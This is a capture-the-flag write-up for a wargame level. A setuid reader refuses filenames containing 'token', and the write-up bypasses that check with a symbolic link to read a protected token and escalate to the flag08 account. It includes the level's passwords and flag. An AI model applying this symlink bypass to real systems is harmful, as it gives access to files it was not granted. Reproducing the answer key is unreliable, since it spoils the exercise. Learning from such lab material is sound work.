`su level08 -> fiumuikeil55xe9cu4dood66h`

We see two files, `token` which is only readable by flag08, and `level08` which we can execute.

```bash
$ ./level08
./level08 [file to read]
$ ./level08 token
You may not access 'token'
$ echo '123' > /tmp/test
$ ./level08 /tmp/test
123
```

So this executable reads then write the file given as argument.

```bash
$ ltrace ./level08 /tmp/test
__libc_start_main(0x8048554, 2, 0xbffff7d4, 0x80486b0, 0x8048720 <unfinished ...>
strstr("/tmp/test", "token")                                                          = NULL
open("/tmp/test", 0, 014435162522)                                                    = 3
read(3, "123\n", 1024)                                                                = 4
write(1, "123\n", 4123
)                                                                  = 4
```

It reads a file if its name doesn't contain token. So we have to make him read `token` referred as another name.

We will try to create a symbolic link to token, so that it will pass the strstr() comparison, but still open()`token`.

```bash
$ ln -s /home/user/level08/token flag
$ ./level08 flag
quif5eloekouj29ke0vouxean
$ su flag08 -> quif5eloekouj29ke0vouxean
$ getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
```